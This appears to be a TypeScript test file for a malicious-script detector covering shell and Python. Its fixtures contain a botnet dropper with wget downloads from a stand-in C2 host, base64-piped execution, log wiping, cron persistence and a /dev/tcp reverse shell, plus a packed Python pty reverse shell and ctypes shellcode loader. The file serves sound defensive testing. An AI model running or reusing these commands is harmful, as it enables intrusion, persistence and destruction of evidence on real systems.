import assert from 'node:assert/strict';
import { test } from 'node:test';
import { deflateSync } from 'node:zlib';

import { analyzeScript } from '../../src/lib/script-analysis';

// Sabores shell e Python da analise de scripts (plans/analise-estatica-ampliada, item 11).

const names = (info: ReturnType<typeof analyzeScript>) => info!.findings.map((f) => f.name);

test("shell: dropper de botnet de IoT, com camada em base64 e $'\\x..'", () => {
  const hidden = Buffer.from(
    'wget http://c2.evil.test/bot.mips -O /tmp/b; chmod +x /tmp/b',
  ).toString('base64');
  const script = [
    '#!/bin/sh',
    'cd /tmp || cd /var/run',
    'for a in mips mpsl arm7 x86 m68k; do wget http://evil.test/bins/$a; done',
    `echo ${hidden} | base64 -d | sh`,
    "eval $'\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f\\x76\\x61\\x72\\x2f\\x6c\\x6f\\x67'",
    'history -c',
    '(crontab -l; echo "* * * * * /tmp/b") | crontab -',
    'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
  ].join('\n');
  const info = analyzeScript(Buffer.from(script), 'x');
  assert.equal(info?.language, 'shell');
  for (const n of [
    'curl/wget',
    '| sh / eval',
    'chmod +x',
    '/dev/tcp',
    'cron/systemd/rc.local',
    'apaga rastros / desliga defesas',
    'binário por arquitetura',
  ]) {
    assert.ok(names(info).includes(n), `${n}: ${names(info)}`);
  }
  assert.ok(
    info!.layers.some((l) => l.method === 'echo | base64 -d' && l.text.includes('bot.mips')),
  );
  assert.ok(info!.layers.some((l) => l.method.startsWith('$') && l.text === 'rm -rf /var/log'));
  assert.equal(info!.risk, 'high');
  assert.ok(info!.urls.includes('http://c2.evil.test/bot.mips'));
});

test('python: exec(zlib(base64)), bytes.fromhex, rot13 e shellcode por ctypes', () => {
  const inner =
    "import socket,os,pty;s=socket.socket();s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0);pty.spawn('/bin/sh')";
  const packed = deflateSync(Buffer.from(inner)).toString('base64');
  const script = [
    'import base64, zlib, codecs, ctypes',
    `exec(zlib.decompress(base64.b64decode('${packed}')))`,
    `url = bytes.fromhex('${Buffer.from('http://c2.evil.test/stage2').toString('hex')}')`,
    "k = codecs.decode('uggc://ebg13.rivy.grfg/k', 'rot13')",
    'p = ctypes.windll.kernel32.VirtualAlloc(0, 4096, 0x3000, 0x40)',
  ].join('\n');
  const info = analyzeScript(Buffer.from(script), 'loader.py');
  assert.equal(info?.language, 'python');
  for (const n of ['exec(b64decode(...))', 'ctypes VirtualAlloc', 'pty.spawn/os.dup2']) {
    assert.ok(names(info).includes(n), `${n}: ${names(info)}`);
  }
  const methods = info!.layers.map((l) => l.method);
  // O bloco Base64 solto e o b64decode dao a mesma camada; vale a primeira que a acha.
  assert.ok(
    info!.layers.some((l) => /zlib/.test(l.method) && l.text.includes('pty.spawn')),
    methods.join(', '),
  );
  assert.ok(
    info!.layers.some(
      (l) => l.method === 'bytes.fromhex' && l.text === 'http://c2.evil.test/stage2',
    ),
  );
  assert.ok(
    info!.layers.some((l) => l.method === 'rot13' && l.text === 'http://rot13.evil.test/x'),
  );
  assert.equal(info!.risk, 'high');
});

test('reconhece pelo conteúdo e não confunde texto comum', () => {
  assert.equal(
    analyzeScript(Buffer.from('#!/usr/bin/env python3\nprint("oi")\n'), 'x')?.language,
    'python',
  );
  assert.equal(analyzeScript(Buffer.from('#!/bin/bash\necho ola\n'), 'x')?.language, 'shell');
  assert.equal(
    analyzeScript(Buffer.from('apenas um texto comum, sem script nenhum.\n'), 'x'),
    null,
  );
});
